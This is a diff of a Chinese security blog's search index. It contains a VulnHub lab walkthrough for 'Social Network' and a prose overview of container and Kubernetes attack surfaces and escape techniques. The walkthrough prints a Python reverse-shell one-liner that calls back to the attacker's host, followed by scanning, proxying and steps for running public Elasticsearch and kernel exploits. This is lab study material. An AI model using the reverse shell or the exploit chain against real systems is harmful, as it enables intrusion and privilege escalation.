-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/.dockerenv</span></span><br><span class="line">或者</span><br><span class="line">cat <span class="string">/proc/1/cgroup</span></span><br></pre></td></tr></table></figure></li>
-<li><p>存活ip扫描</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in $(seq <span class="number">1</span> <span class="number">10</span>); do ping -c <span class="number">1</span> <span class="number">172</span>.<span class="number">17</span>.<span class="number">0</span>.$i; done</span><br></pre></td></tr></table></figure></li>
-<li><p>代理建立</p>
-<img src="../images/pic/daba1.png" alt="image-20211031121233836" style="zoom:50%;" /> </li>
-<li><p>代理扫描</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.2</span></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -p<span class="number">9200</span> -Pn -sT -sV <span class="number">172.17.0.2</span></span><br></pre></td></tr></table></figure></li>
-<li><p>搜索Elasticsearch Exp</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit Elasticsearch</span></span><br></pre></td></tr></table></figure></li>
-<li><p>复制payload</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>remote<span class="regexp">/36337.py ./</span></span><br></pre></td></tr></table></figure></li>
-<li><p>漏洞利用CVE-2015-1427</p>
-</li>
-<li><p>登录，尝试sudo权限：sudo -s</p>
-</li>
-<li><p>搜索内核漏洞</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> linux <span class="number">3</span>.<span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">CVE</span>-<span class="number">2015</span>-<span class="number">1328</span></span><br></pre></td></tr></table></figure></li>
-<li><p>复制exp</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local<span class="regexp">/37292.c ./</span></span><br></pre></td></tr></table></figure></li>
-<li><p>修改exp</p>
-<img src="../images/pic/daba2.png" alt="image-20211031202653110" style="zoom:50%;" /> </li>
-<li><p>搜索依赖so文件</p>
-<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">locate ofs-<span class="keyword">lib</span>.so</span><br></pre></td></tr></table></figure></li>
-<li><p>靶机下载so文件和exp</p>
-</li>
-<li><p>移动到tmp目录</p>
-</li>
-<li><p>执行exp</p>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> <span class="keyword">exp</span></span><br><span class="line">./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure></li>
-</ol>
+<h2 id="1-容器"><a href="#1-容器" class="headerlink" title="1. 容器"></a>1. 容器</h2><p>容器的概念大家都比较了解，我做个简单的介绍。容器使用到两个关键技术Namespaces和Cgroups。Linux Namespaces用于隔离容器的资源，Cgroups则用于限制资源。两者结合就把应用限制在一个容器这个盒子里，互不影响。</p>
+<h2 id="2-Kubernetes"><a href="#2-Kubernetes" class="headerlink" title="2. Kubernetes"></a>2. Kubernetes</h2><p>常见的Kubernetes集群结构图如下，Master节点是集群的控制节点，Node节点则是集群的工作节点。</p>
+<p><img src="../images/pic/k8s.png"></p>
+<p><img src="../images/pic/k8s18.jpg"> </p>
+<p><strong>Master节点：</strong></p>
+<p>master节点是负责管理其他节点的主节点</p>
+<p><strong>Node：</strong></p>
+<p>每个Node节点可以看做一个物理节点。</p>
+<p><strong>pod:</strong></p>
+<p>看第二张图片，每个node上运行着pod，pod相当于跑的一个容器，并且可以修改副本数量，让同一个pod配置文件管理多个容器副本。</p>
+<p><strong>API Server:</strong></p>
+<p>通过API Server接口可以对集群进行管理</p>
+<p><strong>kubelet:</strong></p>
+<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
+<p><strong>etcd：</strong></p>
+<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
+<h2 id="3-容器云攻击面"><a href="#3-容器云攻击面" class="headerlink" title="3. 容器云攻击面"></a>3. 容器云攻击面</h2><p><img src="../images/pic/k8s0.jpg"> </p>
+<h3 id="3-1-容器逃逸"><a href="#3-1-容器逃逸" class="headerlink" title="3.1 容器逃逸"></a>3.1 容器逃逸</h3><p>容器安全中一个重要的攻击点就是容器逃逸，容器逃逸就是从容器中进行权限提升获取宿主机的权限。</p>
+<p>容器逃逸手法有很多，我们做个简单的介绍。</p>
+<p><strong>危险目录挂载：</strong></p>
+<p>如果我们将宿主机根目录、root目录、/root/.ssh等危险目录挂载进了容器，这是很危险的一件事。比如在启动容器的时候将根目录挂载进容器，那么在容器里面可以使用chroot将宿主机目录当做容器的根目录，然后反弹一个shell获取宿主机的shell，或者写入ssh公钥或者写入定时任务等都可以获取到宿主机的shell。从而逃逸容器。</p>
+<p>除了上面说的挂载危险目录，还有两个特殊的目录，Docker Socket和procfs。如果宿主机将Docker Socket的目录/var/run/docker.sock 挂载进行容器，也就是说此容器可以管理其他容器，那么我们就是可以在容器里面创建一个挂载危险目录的容器从而实现逃逸；procfs是一个伪文件系统，存储的是当前内核运行状态的一系列特殊文件，从2.6.19内核版本开始，加入了一个新特性，在/proc/sys/kernel/core_pattern中，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做脚本进行解析，那么我们就可以在管道符后写入后门程序达到命令执行的效果，如果把宿主机的/proc目录挂载进来，那么我们就可以把这个后门写入到宿主机上，从而实现逃逸。</p>
+<p><strong>容器相关组件漏洞：</strong></p>
+<p>CVE-2019-5736 runC容器逃逸漏洞：</p>
+<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
+<p>CVE-2018-15664:符号链接替换漏洞：</p>
+<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行复制之前，将执行容器内的路径替换成一个符号链接，那么复制的时候，宿主机的docker就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。</p>
+<p>CVE-2019-14271:加载不受信任的动态链接：</p>
+<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
+<p><strong>Capabilites安全问题:</strong></p>
+<p>Linux内核中的Capabilities特性用于划分特权集，相当于是对权限做了更细致的划分，比如可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。容器也支持Capabilities，我们可以指定各种特权来限制容器的权限。如果给的权限过大那么就可能导致容器逃逸。</p>
+<ul>
+<li>–privileged或者–cap-add=ALL可以获得所有特权集，如果容器通过privileged启动那么可以很轻松的逃逸容器。</li>
+<li>SYS_ADMIN特权也可以逃逸，但是有比较大的限制，需要启动容器的时候开启额外的配置</li>
+<li>SYS_PTRACE特权结合进程注入也可以逃逸容器，根上面一样启动容器的时候开启额外的配置</li>
+<li>SYS_MODULE特权可以通过加载内核模块进行逃逸，这种利用起来比较方便</li>
+</ul>
+<p><strong>linux内核漏洞：</strong></p>
+<p>利用Linux内核漏洞也是可以逃逸的，比如著名的脏牛。</p>
+<h3 id="3-2-Docker-Remote-API-未授权"><a href="#3-2-Docker-Remote-API-未授权" class="headerlink" title="3.2 Docker Remote API 未授权"></a>3.2 Docker Remote API 未授权</h3><p>如果开起了Docker Remote API，可远程调用API来操作docker。如果我们通过Docker Remote API创建一个特权容器，相当于我们完全控制了主机。</p>
+<h3 id="3-3-镜像安全"><a href="#3-3-镜像安全" class="headerlink" title="3.3 镜像安全"></a>3.3 镜像安全</h3><p>镜像安全存在两种风险，一是使用的镜像存在漏洞，比如使用了有漏洞的应用组件；二是镜像投毒，使用了恶意的镜像。</p>
+<h3 id="3-4-Kubernetes相关组件未授权访问"><a href="#3-4-Kubernetes相关组件未授权访问" class="headerlink" title="3.4 Kubernetes相关组件未授权访问"></a>3.4 Kubernetes相关组件未授权访问</h3><p>在老版本或者通过配置让Kubernetes的端口直接对外暴露会产生高危安全问题，比如Kubernetes API Server未授权，Dashboard未授权访问，kubelet未授权访问等。</p>
+<h3 id="3-5-通过Kubernetes部署后门pod实现持久化"><a href="#3-5-通过Kubernetes部署后门pod实现持久化" class="headerlink" title="3.5 通过Kubernetes部署后门pod实现持久化"></a>3.5 通过Kubernetes部署后门pod实现持久化</h3><p>比如可以部署一个特权容器的pod；如果部署的是一个Daemonset后门pod，这个Pod会自动在每一个节点上都部署一个后门pod。还可以部署一个CronJobs的pod后门，实现定时执行恶意命令。</p>
+<h3 id="3-5-Kubernetes相关漏洞"><a href="#3-5-Kubernetes相关漏洞" class="headerlink" title="3.5 Kubernetes相关漏洞"></a>3.5 Kubernetes相关漏洞</h3><p>CVE-2018-1002105: Kuberntes权限提升：</p>
+<p>此漏洞让能够访问集群的用户获取admin的权限，原理是http请求在升级为websockt的时候，中间代理错误处理不全，导致引起部分错误的请求会直接通过API Serever建立websockt连接，从而控制集群。</p>
+<p>CVE-2019-11253:YAML炸弹：</p>
+<p>通过恶意的yaml，让API Server消耗大量CPU资源，导致拒绝服务攻击。</p>
+<p>CVE-2019-9512/9514: HTTP/2 协议实现存在问题：</p>
+<p>HTTP/2的go实现库存在漏洞，导致处理恶意的HTTP/2流量的时候消耗大量资源，从而拒绝服务</p>
+<h3 id="3-6-Kubernetes网络中间人攻击"><a href="#3-6-Kubernetes网络中间人攻击" class="headerlink" title="3.6 Kubernetes网络中间人攻击"></a>3.6 Kubernetes网络中间人攻击</h3><p>Kubernetes集群中也是可以进行中间人攻击的，通过修改dns解析的地址，劫持流量。解决方案是更细粒度的权限控制，禁用pod的CAP_NET_RAW权限，这样就无法发送ARP和DNS报文。</p>
+<h2 id="4-容器云运行时安全"><a href="#4-容器云运行时安全" class="headerlink" title="4. 容器云运行时安全"></a>4. 容器云运行时安全</h2><p>容器云运行时安全我们使用的方案是用falco进行内核监控，使用它自带的规则和我们自定义的规则来做监控。它的底层是使用的eBPF技术。</p>
+<h3 id="4-1-eBPF"><a href="#4-1-eBPF" class="headerlink" title="4.1 eBPF"></a>4.1 eBPF</h3><p>eBPF是一种包过滤技术，最开始是用来处理网络包的，像tcpdum就是基于eBPF开发的。它的特点就是可以将用户空间的代码直接放到内核去跑，而不用重新编译内核。比如我们用python或者C写的eBPF程序，编译后交给eBPF，就会将代码挂到程序指定的内核位置运行。</p>
+<p>未完待续……</p>
 ]]></content>
       <categories>
-        <category>红队技术</category>
+        <category>云原生安全</category>
       </categories>
       <tags>
-        <tag>打靶</tag>
+        <tag>容器云</tag>
       </tags>
   </entry>
   <entry>
@@ -3873,6 +3796,83 @@ Any-Header: burpcollaborator.net</pre>
       </categories>
       <tags>
         <tag>容器安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>打靶练习1</title>
+    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A01/</url>
+    <content><![CDATA[<blockquote>
+<p>天长地久。天地所以能长且久者，以其不自生，故能长生。</p>
+</blockquote>
+<p>靶机：BoredHackerBlog: Social Network</p>
+<span id="more"></span>
+
+
+
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>
+<p>建议使用VirtualBox搭建环境</p>
+<p><strong>局域网二层扫描</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo arp-scan -l</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>判断存活主机</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./Ladon <span class="number">192.168.0.101</span>/<span class="number">24</span> IcmpScan</span><br></pre></td></tr></table></figure></li>
+<li><p>端口扫描，确定ip</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure></li>
+<li><p>全端口扫描：</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Starting</span> Nmap <span class="number">7</span>.<span class="number">91</span> ( https://nmap.org ) at <span class="number">2021</span>-<span class="number">10</span>-<span class="number">31</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line"><span class="attribute">Nmap</span> scan report for <span class="number">192.168.0.104</span></span><br><span class="line"><span class="attribute">Host</span> is up (<span class="number">0</span>.<span class="number">0013</span>s latency).</span><br><span class="line"><span class="attribute">Not</span> shown: <span class="number">65533</span> closed ports</span><br><span class="line"><span class="attribute">PORT</span>     STATE SERVICE</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh</span><br><span class="line"><span class="attribute">5000</span>/tcp open  upnp</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>服务扫描</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p<span class="number">22</span>,<span class="number">5000</span> -sV <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PORT</span>     STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh     OpenSSH <span class="number">6</span>.<span class="number">6</span>p<span class="number">1</span> Ubuntu <span class="number">2</span>ubuntu<span class="number">1</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">5000</span>/tcp open  http    Werkzeug httpd <span class="number">0</span>.<span class="number">14</span>.<span class="number">1</span> (Python <span class="number">2</span>.<span class="number">7</span>.<span class="number">15</span>)</span><br><span class="line"><span class="attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></li>
+<li><p>目录扫描</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w ~<span class="regexp">/wordlist/</span>Web-Fuzzing-Box<span class="regexp">/Dir/</span>Directories.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">5000</span>FUZZ -mc all -v -fc <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://192.168.0.104:5000/admin">http://192.168.0.104:5000/admin</a></p>
+</li>
+<li><p>python反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.0.101&quot;</span>,<span class="number">8081</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure></li>
+<li><p>容器识别：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/.dockerenv</span></span><br><span class="line">或者</span><br><span class="line">cat <span class="string">/proc/1/cgroup</span></span><br></pre></td></tr></table></figure></li>
+<li><p>存活ip扫描</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in $(seq <span class="number">1</span> <span class="number">10</span>); do ping -c <span class="number">1</span> <span class="number">172</span>.<span class="number">17</span>.<span class="number">0</span>.$i; done</span><br></pre></td></tr></table></figure></li>
+<li><p>代理建立</p>
+<img src="../images/pic/daba1.png" alt="image-20211031121233836" style="zoom:50%;" /> </li>
+<li><p>代理扫描</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.2</span></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -p<span class="number">9200</span> -Pn -sT -sV <span class="number">172.17.0.2</span></span><br></pre></td></tr></table></figure></li>
+<li><p>搜索Elasticsearch Exp</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit Elasticsearch</span></span><br></pre></td></tr></table></figure></li>
+<li><p>复制payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>remote<span class="regexp">/36337.py ./</span></span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞利用CVE-2015-1427</p>
+</li>
+<li><p>登录，尝试sudo权限：sudo -s</p>
+</li>
+<li><p>搜索内核漏洞</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> linux <span class="number">3</span>.<span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">CVE</span>-<span class="number">2015</span>-<span class="number">1328</span></span><br></pre></td></tr></table></figure></li>
+<li><p>复制exp</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local<span class="regexp">/37292.c ./</span></span><br></pre></td></tr></table></figure></li>
+<li><p>修改exp</p>
+<img src="../images/pic/daba2.png" alt="image-20211031202653110" style="zoom:50%;" /> </li>
+<li><p>搜索依赖so文件</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">locate ofs-<span class="keyword">lib</span>.so</span><br></pre></td></tr></table></figure></li>
+<li><p>靶机下载so文件和exp</p>
+</li>
+<li><p>移动到tmp目录</p>
+</li>
+<li><p>执行exp</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> <span class="keyword">exp</span></span><br><span class="line">./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>红队技术</category>
+      </categories>
+      <tags>
+        <tag>打靶</tag>
       </tags>
   </entry>
 </search>
